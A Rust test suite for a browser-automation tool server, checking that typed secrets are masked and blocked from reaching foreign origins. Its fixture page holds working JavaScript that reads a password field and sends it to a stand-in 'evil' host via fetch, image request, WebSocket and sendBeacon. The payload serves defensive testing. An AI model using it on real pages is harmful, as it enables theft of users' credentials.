//! W3.16 gate: secret handles + origin-bound egress + redaction, on both backends.
//!
//! A hostile page reads the typed password out of its own DOM and tries to ship it to a second origin
//! four ways (fetch, img src, WebSocket frame, sendBeacon). All four must be refused and logged, the
//! same-origin login POST must carry the password, and the secret bytes must appear nowhere in the
//! transcript, the action log or the HTTP/page cache. `MANUK_SECRET_MUTATE=1` (guard off) must turn it red.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};
use std::sync::{Arc, Mutex};

use serde_json::{json, Value};

const SECRET: &str = "Tr0ub4dor3-zq91x";
/// OS-keyring item (service=manuk, account=KEYRING_ITEM), stored by scripts/w316-keyring-gate.sh.
const KEYRING_ITEM: &str = "w3a16a-pw";
type Log = Arc<Mutex<Vec<String>>>;

fn page(evil: &str) -> String {
    let ws = evil.replace("http://", "ws://");
    format!(
        r#"<!doctype html><html><head><title>Portal</title></head><body><h1>Portal</h1>
<form method="post" action="/login"><input name="user" aria-label="Username"><input id="pw" name="pw" type="password" aria-label="Password"><button id="go">Log in</button></form>
<button type="button" id="x" onclick="
var v=document.getElementById('pw').value;
fetch('{evil}/f?d='+encodeURIComponent(v));
var im=document.createElement('img');im.src='{evil}/i?d='+encodeURIComponent(v);document.body.appendChild(im);
var w=new WebSocket('{ws}/w');w.onopen=function(){{w.send(v)}};
navigator.sendBeacon('{evil}/b',v);
">Exfil</button></body></html>"#
    )
}

/// One HTTP server that logs `METHOD path body` for every request; with `ws` it also completes WebSocket
/// handshakes and logs each text frame as `WS frame`.
fn serve(html: Arc<Mutex<String>>) -> (String, Log) {
    let log: Log = Arc::default();
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = l.local_addr().unwrap();
    let lg = log.clone();
    std::thread::spawn(move || {
        for s in l.incoming() {
            let Ok(s) = s else { continue };
            let (lg, html) = (lg.clone(), html.clone());
            std::thread::spawn(move || conn(s, lg, html));
        }
    });
    (format!("http://{addr}"), log)
}

fn conn(mut s: TcpStream, lg: Log, html: Arc<Mutex<String>>) {
    let mut peek = [0u8; 2048];
    let n = s.peek(&mut peek).unwrap_or(0);
    if n == 0 {
        return;
    }
    if String::from_utf8_lossy(&peek[..n])
        .to_ascii_lowercase()
        .contains("upgrade: websocket")
    {
        if let Ok(mut ws) = tungstenite::accept(s) {
            while let Ok(m) = ws.read() {
                if let tungstenite::Message::Text(t) = m {
                    lg.lock().unwrap().push(format!("WS frame {t}"));
                }
            }
        }
        return;
    }
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    let head_end = loop {
        let n = s.read(&mut chunk).unwrap_or(0);
        if n == 0 {
            return;
        }
        buf.extend_from_slice(&chunk[..n]);
        if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
            break i + 4;
        }
    };
    let head = String::from_utf8_lossy(&buf[..head_end]).to_string();
    let first = head.lines().next().unwrap_or("").to_string();
    let want: usize = head
        .lines()
        .find_map(|l| {
            l.to_ascii_lowercase()
                .strip_prefix("content-length:")
                .map(|v| v.trim().parse().unwrap_or(0))
        })
        .unwrap_or(0);
    while buf.len() < head_end + want {
        let n = s.read(&mut chunk).unwrap_or(0);
        if n == 0 {
            break;
        }
        buf.extend_from_slice(&chunk[..n]);
    }
    let body = String::from_utf8_lossy(&buf[head_end..]).to_string();
    if !first.contains("favicon") {
        lg.lock().unwrap().push(format!("{first} | {body}"));
    }
    let resp = if first.contains(" / ") {
        html.lock().unwrap().clone()
    } else {
        "ok".into()
    };
    let ctype = if first.contains(" / ") {
        "text/html"
    } else {
        "text/plain"
    };
    let _ = write!(
        s,
        "HTTP/1.1 200 OK\r\nContent-Type: {ctype}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp}",
        resp.len()
    );
}

struct Client {
    child: Child,
    tx: ChildStdin,
    rx: BufReader<ChildStdout>,
    id: u64,
    stderr: PathBuf,
}

impl Client {
    fn start(chrome: bool, dir: &Path, mutate: bool, keyring: bool) -> Client {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_manuk-mcp"));
        if chrome {
            cmd.args(["--backend", "chrome"]);
        }
        if mutate {
            cmd.env("MANUK_SECRET_MUTATE", "1");
        }
        let stderr = dir.join("stderr.txt");
        // MANUK_TAINT=off isolates the secret guard: the separate value-flow taint would otherwise
        // refuse these requests first, on the fixture's loopback URL token, and hide the mutant's leak.
        cmd.env("MANUK_TAINT", "off")
            .env("MANUK_ACTLOG_DIR", dir.join("actlog"))
            .env("MANUK_HTTP_CACHE_DIR", dir.join("cache"))
            .arg("--allow-write")
            .arg(dir);
        if keyring {
            // The password must come from the OS keyring (secret-tool), not the env provider. The confined
            // process cannot exec secret-tool (landlock grants no exec: agent/src/confine.rs), so this run
            // is unconfined; see the W3.16.a follow-up row.
            cmd.arg("--no-confine").env_remove("MANUK_SECRET_PORTALPW");
        } else {
            cmd.env("MANUK_SECRET_PORTALPW", SECRET);
        }
        let mut child = cmd
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(std::fs::File::create(&stderr).unwrap())
            .spawn()
            .expect("spawn manuk-mcp");
        let tx = child.stdin.take().unwrap();
        let rx = BufReader::new(child.stdout.take().unwrap());
        let mut c = Client {
            child,
            tx,
            rx,
            id: 0,
            stderr,
        };
        c.rpc("initialize", json!({"protocolVersion": "2025-03-26", "capabilities": {}, "clientInfo": {"name": "t", "version": "0"}}));
        c.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
        c
    }
    fn send(&mut self, v: Value) {
        writeln!(self.tx, "{v}").unwrap();
        self.tx.flush().unwrap();
    }
    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.id += 1;
        let id = self.id;
        self.send(json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}));
        loop {
            let mut line = String::new();
            assert!(
                self.rx.read_line(&mut line).unwrap() > 0,
                "server closed stdout"
            );
            let v: Value = serde_json::from_str(&line).unwrap();
            if v["id"] == json!(id) {
                return v;
            }
        }
    }
    fn call(&mut self, name: &str, args: Value) -> (bool, String) {
        let r = self.rpc("tools/call", json!({"name": name, "arguments": args}));
        let blocks = r["result"]["content"]
            .as_array()
            .cloned()
            .unwrap_or_default();
        (
            r["result"]["isError"].as_bool().unwrap_or(false),
            blocks
                .iter()
                .filter_map(|b| b["text"].as_str())
                .collect::<Vec<_>>()
                .join("\n"),
        )
    }
}
impl Drop for Client {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn handle_of(text: &str, needle: &str) -> String {
    let line = text
        .lines()
        .find(|l| l.contains(needle))
        .unwrap_or_else(|| panic!("no {needle:?} in:\n{text}"));
    let s = line.find("[h").unwrap();
    let e = line[s..].find(']').unwrap() + s;
    line[s + 1..e].to_string()
}

fn grep_dir(d: &Path, needle: &str) -> usize {
    let mut n = 0;
    if let Ok(rd) = std::fs::read_dir(d) {
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                n += grep_dir(&p, needle);
            } else if std::fs::read(&p)
                .is_ok_and(|b| b.windows(needle.len()).any(|w| w == needle.as_bytes()))
            {
                n += 1;
            }
        }
    }
    n
}

struct Outcome {
    transcript: String,
    evil: Vec<String>,
    app: Vec<String>,
    refusals: Vec<String>,
    store_hits: usize,
}

fn run(chrome: bool, mutate: bool, keyring: bool) -> Outcome {
    let dir = std::env::temp_dir().join(format!(
        "w316-{}-{chrome}-{mutate}-{keyring}",
        std::process::id()
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let html = Arc::new(Mutex::new(String::new()));
    let (app, app_log) = serve(html.clone());
    let (evil, evil_log) = serve(Arc::new(Mutex::new(String::new())));
    *html.lock().unwrap() = page(&evil);
    let mut c = Client::start(chrome, &dir, mutate, keyring);
    let mut transcript = String::new();
    let mut step = |c: &mut Client, name: &str, args: Value| {
        let (_, t) = c.call(name, args);
        transcript.push_str(&t);
        transcript.push('\n');
        t
    };
    let nav = step(&mut c, "navigate", json!({"url": format!("{app}/")}));
    step(
        &mut c,
        "type",
        json!({"handle": handle_of(&nav, "\"Username\""), "text": "alice"}),
    );
    step(
        &mut c,
        "type",
        json!({"handle": handle_of(&nav, "\"Password\""), "secret": if keyring { KEYRING_ITEM } else { "portalpw" }}),
    );
    step(
        &mut c,
        "act",
        json!({"handle": handle_of(&nav, "\"Exfil\""), "action": "click"}),
    );
    std::thread::sleep(std::time::Duration::from_millis(2500));
    // The manuk engine fetches a dynamically inserted <img> only when visuals load (a screenshot).
    step(&mut c, "screenshot", json!({}));
    step(&mut c, "observe", json!({}));
    step(
        &mut c,
        "act",
        json!({"handle": handle_of(&nav, "\"Log in\""), "action": "click"}),
    );
    std::thread::sleep(std::time::Duration::from_millis(1500));
    step(&mut c, "observe", json!({}));
    let stderr = c.stderr.clone();
    drop(c);
    let refusals: Vec<String> = std::fs::read_to_string(stderr)
        .unwrap_or_default()
        .lines()
        .filter(|l| l.contains("EGRESS-DENIED (secret)"))
        .map(String::from)
        .collect();
    let store_hits = grep_dir(&dir.join("actlog"), SECRET) + grep_dir(&dir.join("cache"), SECRET);
    let (evil, app) = (
        evil_log.lock().unwrap().clone(),
        app_log.lock().unwrap().clone(),
    );
    Outcome {
        transcript,
        evil,
        app,
        refusals,
        store_hits,
    }
}

fn assert_green(chrome: bool, keyring: bool) {
    let o = run(chrome, false, keyring);
    assert!(
        !o.evil.iter().any(|l| l.contains(SECRET)),
        "secret reached evil origin: {:#?}",
        o.evil
    );
    for kind in ["page request", "WebSocket frame"] {
        assert!(
            o.refusals.iter().any(|r| r.contains(kind)),
            "no logged refusal for {kind}: {:#?}",
            o.refusals
        );
    }
    // Chrome fetches the late-inserted <img>, so it owes fetch + img + beacon. The manuk engine does not
    // fetch an <img> inserted after load (its images load once, in finish_loading; load_visuals is lean-only):
    // that channel never leaves the process even with the guard off, so manuk owes fetch + beacon.
    let owed = if chrome { 3 } else { 2 };
    let pr = o
        .refusals
        .iter()
        .filter(|r| r.contains("page request"))
        .count();
    assert!(
        pr >= owed,
        "want {owed} page-request refusals, got {pr}: {:#?}",
        o.refusals
    );
    assert!(
        o.app
            .iter()
            .any(|l| l.starts_with("POST /login") && l.contains(SECRET)),
        "same-origin login POST lacks the password: {:#?}",
        o.app
    );
    assert!(
        !o.transcript.contains(SECRET),
        "secret in transcript:\n{}",
        o.transcript
    );
    assert!(
        o.transcript.contains("•••"),
        "no mask in transcript:\n{}",
        o.transcript
    );
    assert_eq!(o.store_hits, 0, "secret bytes in the action log / cache");
}

/// W3.16.a: the TOTP provider's code equals `oathtool --totp -b --now=@<t> <seed>` at fixed times (oathtool
/// 2.6.x, reference codes generated for this gate). A wrong vector or a wrong HMAC/truncation goes red here.
#[test]
fn totp_equals_oathtool_at_fixed_times() {
    let vectors: &[(&str, u64, &str)] = &[
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 0, "755224"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 59, "287082"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1000000000, "864010"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1111111109, "081804"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1234567890, "005924"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1700000000, "921300"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 2000000000, "279037"),
        ("JBSWY3DPEHPK3PXP", 0, "282760"),
        ("JBSWY3DPEHPK3PXP", 59, "996554"),
        ("JBSWY3DPEHPK3PXP", 1000000000, "949556"),
        ("JBSWY3DPEHPK3PXP", 1111111109, "071271"),
        ("JBSWY3DPEHPK3PXP", 1234567890, "742275"),
        ("JBSWY3DPEHPK3PXP", 1700000000, "324550"),
        ("JBSWY3DPEHPK3PXP", 2000000000, "890699"),
    ];
    for (seed, t, want) in vectors {
        assert_eq!(
            manuk_net::secrets::totp(seed, *t).unwrap(),
            *want,
            "seed {seed} at t={t}"
        );
    }
}

#[test]
fn manuk_backend_blocks_all_four_and_login_succeeds() {
    assert_green(false, false);
}

#[test]
fn chrome_backend_blocks_all_four_and_login_succeeds() {
    assert_green(true, false);
}

/// Needs an unlocked Secret Service holding `KEYRING_ITEM` = SECRET (service=manuk). Build the store inside a
/// private session so the user's login keyring is untouched; run scripts/w316-keyring-gate.sh.
/// Ignored by default: a machine without that store must not look green.
#[test]
#[ignore = "needs an unlocked secret service holding KEYRING_ITEM; run scripts/w316-keyring-gate.sh"]
fn keyring_backend_blocks_all_four_and_login_succeeds() {
    let stored = std::process::Command::new("secret-tool")
        .args(["lookup", "service", "manuk", "account", KEYRING_ITEM])
        .output()
        .expect("secret-tool missing");
    assert_eq!(
        String::from_utf8_lossy(&stored.stdout).trim_end_matches('\n'),
        SECRET,
        "keyring item {KEYRING_ITEM} is not stored; the gate cannot run"
    );
    assert_green(false, true);
}

#[test]
#[ignore = "needs the keyring item; run scripts/w316-keyring-gate.sh"]
fn guard_off_keyring_run_leaks_so_the_gate_goes_red() {
    let o = run(false, true, true);
    assert!(
        o.evil.iter().any(|l| l.contains(SECRET)),
        "keyring mutant did not leak; the gate cannot go red: {:#?}",
        o.evil
    );
}

#[test]
fn guard_off_manuk_run_leaks_so_the_gate_goes_red() {
    let o = run(false, true, false);
    for ch in ["GET /f?", "POST /b", "WS frame"] {
        assert!(
            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
            "mutant lacks {ch}: {:#?}",
            o.evil
        );
    }
    assert!(
        o.evil.iter().any(|l| l.contains(SECRET)),
        "mutant did not leak; the gate cannot go red: {:#?}",
        o.evil
    );
}

#[test]
fn guard_off_chrome_run_leaks_so_the_gate_goes_red() {
    let o = run(true, true, false);
    assert!(
        o.evil.iter().any(|l| l.contains(SECRET)),
        "mutant did not leak; the gate cannot go red: {:#?}",
        o.evil
    );
}
